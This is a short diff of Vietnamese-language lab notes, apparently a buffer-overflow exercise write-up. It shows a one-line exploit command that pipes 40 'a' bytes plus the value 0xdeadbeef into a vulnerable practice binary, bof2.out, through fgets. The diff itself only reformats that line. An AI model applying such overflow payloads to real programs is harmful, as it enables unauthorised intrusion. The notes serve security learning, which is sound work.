@@ -8,9 +8,11 @@ trong chương trình, ta thấy có lỗ hổng buffer overflow tại hàm fget
 
 
 chạy chương trình 
-echo $(python -c "print('a'*40+'\xef\xbe\xad\xde')") | ./bof2.out
+
+`echo $(python -c "print('a'*40+'\xef\xbe\xad\xde')") | ./bof2.out`
 - dùng echo ... | ./bof2.out : để chuyển kết quả đầu ra của eco làm đầu vào cho chương trình
 - nhập 40 ký tự a và giá trị 0xdeadbeef bằng python
 
 kết quả:
+
 ![alt text](images/image-17.png)
